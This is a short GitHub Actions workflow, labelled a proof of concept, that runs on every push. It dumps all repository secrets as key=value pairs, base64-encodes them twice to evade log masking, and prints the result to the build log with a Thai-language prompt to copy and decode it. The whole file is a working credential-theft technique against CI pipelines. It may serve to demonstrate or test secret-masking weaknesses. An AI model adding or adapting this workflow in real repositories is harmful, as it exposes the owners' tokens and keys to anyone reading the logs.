name: PoC - Secrets Leak (Base64 Double-Encoded)

on: push

jobs:
  leak-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Dump secrets → Double Base64 (for evasion demo)
        run: |
          echo "=== DOUBLE BASE64 ENCODED SECRETS (DEMO) ==="
          echo '${{ toJSON(secrets) }}' \
            | jq -r 'to_entries[] | "\(.key)=\(.value)"' \
            | base64 -w 0 \
            | base64 -w 0 \
            | tee /tmp/double-encoded-secrets.txt

          echo ""
          echo "Encoded payload (copy ด้านล่างไป decode):"
          cat /tmp/double-encoded-secrets.txt
          echo ""
